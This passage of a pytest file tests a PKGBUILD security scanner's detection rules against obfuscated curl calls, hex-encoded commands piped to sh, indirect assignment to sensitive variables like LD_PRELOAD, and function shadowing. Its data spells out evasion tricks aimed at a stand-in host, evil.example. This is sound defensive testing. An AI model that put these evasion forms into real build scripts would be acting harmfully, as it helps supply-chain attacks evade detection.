    reach it. `export CMD=curl` is an assignment like any other."""
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n build() {\n"
            f"+  {keyword} CMD=curl\n+  $CMD https://evil.example\n }}\n")
    assert "X002" not in set(crossfire_techniques(diff)), keyword


# ---------------------------------------------------------------------------
# A bound is a bypass for anyone willing to type one more character.
# ---------------------------------------------------------------------------

#: (rule, short spelling, the same thing padded past the old bound). Each
#: bound was there for backtracking safety, and each was a length-based way
#: out: 41 characters inside the quotes, 61 before the confusable, 61 inside
#: the braces, 201 between the blob and the pipe.
PADDED_EVASIONS = [
    ("X002", 'c"u"rl https://evil.example',
             'c"' + "u" * 45 + '"rl https://evil.example'),
    ("X002", "\u0441url https://evil.example",
             "a" * 70 + "\u0441url https://evil.example"),
    ("X002", "cur{l,} https://evil.example",
             "cur{l," + "x" * 70 + "} https://evil.example"),
    ("X001", r"printf '\x63\x75\x72' | sh",
             r"printf '\x63\x75\x72' " + "-" * 250 + " | sh"),
]


@pytest.mark.parametrize("rule,short,padded", PADDED_EVASIONS)
def test_padding_does_not_walk_past_a_shape(rule, short, padded):
    assert rule in _fire(short), f"{rule}: the short spelling stopped matching"
    assert rule in _fire(padded), f"{rule}: padding walked past it"


@pytest.mark.parametrize("label,probe", [
    # The inputs that made the unbounded versions quadratic. A bound removed
    # in exchange for a quadratic is no trade: `is_superlinear` refuses
    # exactly this shape at compile time.
    ("brace with no close", "x{" + "," * 8192),
    ("many blobs, no pipe", "printf '" + "\\x63" * 2048),
    ("alternating quotes", 'a"' * 4096),
    ("quote run", '"' * 8192),
])
def test_an_unbounded_span_stays_linear(label, probe):
    import time

    from trustsight.analysis.crossfire import X001_RE, X002_SHAPES

    worst = 0.0
    for _name, rx in X002_SHAPES:
        start = time.perf_counter()
        rx.match(probe)
        worst = max(worst, time.perf_counter() - start)
    start = time.perf_counter()
    X001_RE.search(probe)
    worst = max(worst, time.perf_counter() - start)
    assert worst < 0.05, f"{label}: {worst * 1000:.0f}ms on one clamped line"


# ---------------------------------------------------------------------------
# X024: indirect assignment to a sensitive variable
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("command", [
    'DLAGENTS=("${_agents[@]}")',
    'COMPRESSZST=$(get_compress)',
    'CFLAGS="${_cflags[*]}"',
    'LDFLAGS=`echo $LDFLAGS`',
    'PACMAN_AUTH="${_auth}"',
    'MAKEFLAGS=("${_makeflags[@]}")',
    'PATH="${_newpath}"',
    'LD_PRELOAD="${_preload}"',
])
def test_x024_fires_on_indirect_assignment(command):
    assert "X024" in _fire(command)


@pytest.mark.parametrize("command", [
    "DLAGENTS=('http::/usr/bin/curl')",
    'CFLAGS="-O2 -march=x86-64"',
    "LDFLAGS=\"-Wl,-O1 -Wl,--as-needed\"",
    'MAKEFLAGS="-j$(nproc)"',
])
def test_x024_quiet_on_literal_assignment(command):
    assert "X024" not in _fire(command)


# ---------------------------------------------------------------------------
# X025: multi-line function shadow
# ---------------------------------------------------------------------------


def test_x025_fires_on_multiline_msg_shadow():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n"
            " pkgname=demo\n"
            "+msg()\\\n"
            "+{\n"
            "+  echo 'clean'\n"
            "+}\n")
    assert "X025" in set(crossfire_techniques(diff))


def test_x025_fires_on_multiline_cd_shadow():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n"
            " pkgname=demo\n"
            "+cd()\\\n"
            "+{\n"
            "+  builtin cd \"$@\"\n"
            "+}\n")
    assert "X025" in set(crossfire_techniques(diff))


def test_x025_quiet_on_multiline_build():
    """build() split across lines is not a shadow."""
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n"
            " pkgname=demo\n"
            "+build()\\\n"
            "+{\n"
            "+  make\n"
            "+}\n")
    assert "X025" not in set(crossfire_techniques(diff))


def test_x025_quiet_on_single_line_shadow():
    """Single-line shadow is H097's job, not X025."""
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n"
            " pkgname=demo\n"
            "+msg() { echo 'clean'; }\n")
    assert "X025" not in set(crossfire_techniques(diff))
